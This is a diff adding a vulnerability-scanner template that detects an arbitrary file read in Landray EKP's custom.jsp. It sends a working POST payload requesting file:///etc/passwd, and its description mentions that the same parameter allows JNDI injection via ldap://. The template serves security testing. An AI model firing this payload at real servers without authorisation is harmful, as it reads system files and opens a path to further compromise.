@@ -1,0 +1,30 @@
+id: scopesentry-landray-customjsp-fileread
+
+info:
+  name: Landray EKP custom.jsp Arbitrary File Read
+  author: scopesentry
+  severity: high
+  description: |
+    蓝凌 EKP /sys/ui/extend/varkind/custom.jsp 的 var.body.file 直接交给文件读取器。
+    判据：file:///etc/passwd 内容回显（root:x:0:0:）。同一入口换成 ldap:// 即 JNDI，本模板刻意只做读文件。
+  tags: landray,ekp,lfi,file-read
+  metadata:
+    verified: false
+    max-request: 1
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/sys/ui/extend/varkind/custom.jsp'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'var={"body":{"file":"file:///etc/passwd"}}'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+      - type: status
+        status:
+          - 200
